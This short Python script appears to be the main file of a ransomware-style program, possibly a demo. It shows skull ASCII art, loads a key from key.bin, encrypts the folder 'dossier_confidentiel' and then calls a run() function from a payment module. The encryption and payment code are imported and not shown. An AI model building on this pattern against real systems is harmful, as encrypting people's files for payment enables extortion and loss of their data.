from crypto.encrypter import encrypt_folder
from lessidoidlam1 import print_ascii_art
from payment.payment import run

print_ascii_art("skull_horns")

with open("key.bin", "rb") as f:
    key = f.read()

encrypt_folder("./dossier_confidentiel", key)
run()
# print_ascii_art("6doigts")